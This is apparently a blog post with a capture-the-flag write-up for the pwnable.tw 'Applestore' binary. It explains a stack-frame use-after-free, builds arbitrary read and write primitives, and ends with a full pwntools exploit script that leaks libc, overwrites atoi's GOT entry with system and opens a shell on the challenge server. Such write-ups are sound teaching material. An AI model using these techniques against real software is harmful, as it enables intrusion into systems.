---
layout: post
title:  "Pwnable.tw - Applestore"
date:   2025-01-10 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Applestore

*tomcr00se rooted the galaxy S5, but we need you to jailbreak the iPhone8!* \
Smells like real-world pwnage, cool :)

```bash
$ checksec ./applestore
[*] '/home/itay/projects/pwnable_tw/applestore/applestore'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8047000)
    Stripped:   No

$ file ./applestore
./applestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped
```

## Overview

Another menu-based challenge. There are 6 options: `Apple Store, add to cart, remove from cart, list, checkout, exit`. There's also an interesting `myCart` global variable, zero-initialized. 
The interesting handlers are `add, delete, cart, checkout`. \
Sus notes:

1. `add` handler - uses local `char nptr[22]` buffer on the stack. This buffer is uninitialized, and also contains weird un-aligned amount of bytes. 

2. The device number is called using `my_read`, which reads `n` bytes, and then truncates the last byte. Eventually `atoi` is being called on this buffer. Hence, we may store there some controlled bytes, such as `1/bin/sh`, and the output choice would still be parsed properly. 

3. Upon choosing an item to purchace, `create` is called - which allocates a new item and initializes it. Notice it uses the interesting function `asprintf` - similar to `sprintf`, but also allocates the buffer dynamically on the heap, including the null-byte. This means that for each invocation of `create`, two allocations are performed: `malloc(0x10)` of the item object, which is properly initialized, and another allocation for the name string, using `asprintf`. SUS: what happens in case the name string isn't aligned? In that case, is the returned chunk properly initialized to `0`, or only contains `\x00` at the string end, and having potential garbage past it? Anyways - we cannot control the name string directly, but there are 5 options we can pick from, having sizes (not including the null) of `8, 13, 10, 11, 10`. 

4. After creating an item, it is being inserted to the global `myCart` variable. The cart is the first `item` object, and because each `item` contains `next, prev` pointers, the items are actually stored within a linked list. Upon adding an item, the list is traversed until some item's `next` ptr is NULL, which denotes the list end. In that case, the newly-created item is appended to the linked list. 

5. After appending the item to the list, a prompt of `printf(%s, item->name)` is done. If we can corrupt the `item` pointer / object, this may serve as a good read primitive.

6. `delete` - receives an item index, starting at `1`, and traverses over the items linked list array until that number is reached. If thats the case, it unlinks the chunk off the list, and prints the chunk's `name` member (can also serve as leak primtive?)

7. Traversing is stopped only when `NULL` ptr is found. If we can corrupt some chunk's `next` ptr, we would perform OOB-R. 

8. The unlinked item **remains fully allocated**, and its content remains floating, unchanged, in memory. This is hella sus - why `free` isn't called? And in general - this program doesn't calls `free` at all!

9. `cart` - traverses the items linked list, printing their assigned `name` and `price`. If we can corrupt these, decent leak primitive. 

10. Notice the sus prompt, of asking to check the cart. It reads `0x15` bytes into a stack buffer, comparing the first byte to `y`. We can still set the other bytes to some garbage we'd like. 

11. The `total_price` is defined as `signed int`. Also, there seems to be possible integer overflow, hence we can set it to some low / negative value. 

12. The `checkout` handler is where the real interesting bug happens. If we've set the `total_price` to some specific value of `7174`, it **allocates a new item within the stack, and inserts it to the dynamic linked-list**. This vuln is very interesting, as the inserted item is allocated on the local stack frame of `checkout` - which is about to get destructed by some other stack frames to-be-called. 

13. Notice, the above special item is being added only in case the `total_price` matches a particular value, and this item has a value of `1`. Hence, it won't be trivial to insert this item more than once into the linked list. 

## Exploitation

The main vuln of this challenge seems to be "stack-frame UAF" - a reference to a stack object is saved somewhere, the frame is destructed but the reference remains:

```c
  item v2;
  total_price = cart();
  if ( total_price == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(&v2.name, "%s", "iPhone 8");
    v2.price = 1;
    insert(&v2);
    total_price = 7175;
  }
```

The first question - how can we set `total_price == 7174`? \
We can achieve this by `20 * 299 + 6 * 199`. The mathematical trick here, is to utilize the fact that all prices are ending with `99`. Hence, each addition would add a multiple of `100`, and decrement the total sum by 1. This means we can inverse the logic, and count the amont of decrements (`7200 - 7174 = 26`) we need. The formula is equivalent to finding `a, b, c, d`, such that `a * 2 + b * 3 + c * 4 + d * 5 = 72`, where the sum `a + b + c + d = 26`. \
To generalize, we have the linear solution: `[6 + c + 2*d, 20 - 2*c - 3*d, c, d]`. This may serve us, in case we'd need particular items allocations. 

Our next goal is to find an adequate candidate function, that would allocate local stack content on the same address of the special item. We must be able to control that memory, at least partially. \
Now the fact that we use `buf[22]` for `atoi`'s input makes sense - we'd like to aim this buffer to overlap with the destructed item object. 
The `add` handler seems as a very adequate candidate, as its `nptr` (read input buffer) overlaps exactly with the fake `item` object. 

### Read Primitive

After adding our special item to the linked list, we'd first like to achieve libc leak, and optionally heap leak. \
There are 2 trivial leaking handlers - `cart` and `delete(27)`. \
By some debugging, I've found `cart` is a good candidate, as it doesn't changes the linked-list state. 
Moreover, by setting the `next, prev` ptrs to `NULL`, it would stop traversing the linked list. 
Picking the `name` field to be our arbitrary pointer, would yield us the desired arbitrary read primitive. \
Having arbitrary read primtive, we can easily leak libc address by reading a GOT entry. 
From there we have all needed addresses, as we can leak heap addresses using `main_arena`, and stack addresses using `environ`. 

### Write Primitive

I'd like to achieve arbitrary write primitive. 
The `add` handler simply sets the `prev` of a chunk (which we may control) into the address of a fresh new allocation, which we dont control. 
However, the `delete` handler seems to have much more logic we can mess with. 
In this implementation, the unlink algorithm performs the following:

```bash
if prev:
  *(prev + 12) = next
if next:
  *(next + 8) = prev
```

In fact, we have the following 2 options:

1. Complete arbitrary write-nullptr primitive, as theres `if prev/next` checks prior to the writes.

2. Arbitrary write, of write-dereferenceable values. 

Hence, if we would overwrite the content of some address to `next`, we must make sure `next + 8` is writeable. 
This write primitive is abit annoying, as it doesn't allows writing code segment addresses.
However, we can still mess with data pointers. 
In particular, we can overwrite the file stream pointers. 
These are good candidates for implementation of arbitrary write. \
Another, better option is to mess with other data pointers, such as the frame pointer. 
In that case, the outer frame's (`handler`) would be corrupted. 
This is particulary interesting, as `handler` frame contains only 2 local variables: `nptr, canary`. 
While the canary isn't being used until the main program loop's termination, the `nptr` is solely used as a parameter of `my_read`. 
**Hence, by pivoting the outer frame's stack, we would improve our write primitive to arbitrary linear write of 0x21 bytes**

## Solution

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10104
context.arch='i386'
BINARY = './applestore'
LIBC = './libc_32.so.6'
LD = './ld-2.23.so'

GDB_SCRIPT = '''
#b *0x8048a1b
#commands
#    p "Gonna perform write"
#end

b *0x8048a6f
commands
    p "delete gonna exit"
end

#b *0x8048c05
#commands
#    p "gonna write"
#end

c
'''

def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def chunkSize(alloc_size):
    assert(alloc_size >= 0)
    min_size = alloc_size + SIZEOF_PTR
    res = min_size % (2 * SIZEOF_PTR)
    pad = (2 * SIZEOF_PTR) - res if res else 0
    return min_size + pad

def allocSize(chunkSize):
    assert((chunkSize & 0xf) == 0)
    return chunkSize - SIZEOF_PTR

def recvPointer(p):
    leak = p.recv(SIZEOF_PTR)
    assert(len(leak) == SIZEOF_PTR)
    leak = u32(leak)
    assert(leak > 0x10000)
    return leak

###### Constants ######
IS_DEBUG = False
IS_REMOTE = True
SIZEOF_PTR = 4
ITEMS_1_NO = 6
ITEMS_2_NO = 20
ITEMS_NO = ITEMS_1_NO + ITEMS_2_NO
MY_READ_COUNT = 21

###### Offsets ######
libc_heap_ptr = 0x188eb
heap_ptr_to_base = 0x710c
environ_to_handler_ebp = 260

###### Addresses ######
binary = ELF(BINARY)
main_binary = binary.symbols['main']
puts_got = binary.got['puts']
puts_plt = binary.plt['puts']
atoi_got = binary.got['atoi']
atoi_plt = binary.plt['atoi']
fake_name = next(binary.search(b'Stop doing that. Idiot!'))

libc = ELF(LIBC)
bin_sh_libc = next(libc.search(b'/bin/sh'))
system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']
environ_libc = libc.symbols['environ']
log.info(f'bin_sh_libc: {hex(bin_sh_libc)}')
log.info(f'system_libc: {hex(system_libc)}')
log.info(f'puts_libc: {hex(puts_libc)}')
log.info(f'environ: {hex(environ_libc)}')

libc_rop = ROP(LIBC)
pop_eax_ret = libc_rop.eax.address
pop_ebx_ret = libc_rop.ebx.address
pop_ecx_ret = libc_rop.ecx.address
pop_edx_ret = libc_rop.edx.address
leave_ret = libc_rop.find_gadget(['leave']).address
int_80 = libc_rop.find_gadget(['int 0x80']).address
log.info(f'pop_eax_ret: {hex(pop_eax_ret)}')
log.info(f'pop_ebx_ret: {hex(pop_ebx_ret)}')
log.info(f'pop_ecx_ret: {hex(pop_ecx_ret)}')
log.info(f'pop_edx_ret: {hex(pop_edx_ret)}')
log.info(f'leave_ret: {hex(leave_ret)}')
log.info(f'int_80: {hex(int_80)}')

def add(p, num):
    p.sendline(b'2')
    p.recvuntil(b'Device Number> ')
    p.sendline(num)
    p.recvuntil(b'> ')

def delete(p, num, buf=b''):
    p.sendline(b'3')
    p.recvuntil(b'Item Number> ')
    p.send(str(num).encode() + buf)

def cart_inner(p, buf=b''):
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.send(b'y\n' + buf)

def cart(p, buf=b''):
    p.sendline(b'4')
    cart_inner(p, buf)
    p.recvuntil(b'==== Cart ====\n')

def checkout(p):
    p.sendline(b'5')
    cart_inner(p)
    p.recvuntil(b'> ')

def buy_special_item(p):
    p.recvuntil(b'> ')
    for _ in range(ITEMS_1_NO):
        add(p, b'1')
    for _ in range(ITEMS_2_NO):
        add(p, b'2')
    checkout(p)    

def arbitrary_read(p, addr):
    buf = p32(addr)     # name
    buf += b'A' * 4     # price
    buf += p32(0)       # next
    buf += p32(0)       # prev 
    cart(p, buf)
    p.recvuntil(str(ITEMS_NO + 1).encode() + b': ')
    data = recvPointer(p)
    p.recvuntil(b'> ')
    return data

def get_leaks(p):
    puts_libc_addr = arbitrary_read(p, addr=puts_got)
    libc_base = puts_libc_addr - puts_libc
    assert(libc_base & 0xfff == 0)

    p_libc_heap_ptr = libc_base + libc_heap_ptr
    heap_ptr = arbitrary_read(p, addr=p_libc_heap_ptr)
    heap_base = heap_ptr - heap_ptr_to_base
    assert(heap_base & 0xfff == 0)

    p_environ = libc_base + environ_libc
    environ = arbitrary_read(p, addr=p_environ)
    
    return libc_base, heap_base, environ

def arbitrary_write(p, addr, value):
    buf = p32(fake_name)  # name
    buf += b'B' * 4  # price
    buf += p32(value)  # next
    buf += p32(addr - 8) # prev
    delete(p, ITEMS_NO + 1, buf)
    p.recvuntil(b'> ')

def exploit(p):
    buy_special_item(p)
    libc_base, heap_base, environ = get_leaks(p)    
    log.info(f'libc_base: {hex(libc_base)}')
    log.info(f'heap_base: {hex(heap_base)}')
    log.info(f'environ: {hex(environ)}')

    prev_ebp_addr = environ - environ_to_handler_ebp
    arbitrary_write(p, addr=prev_ebp_addr, value=atoi_got + 0x1c)
    buf = b'sh;;;;'
    buf += p32(libc_base + system_libc)
    buf += b';' * (MY_READ_COUNT - len(buf))
    p.sendline(buf)


def main():
    if IS_DEBUG:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if IS_REMOTE:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```
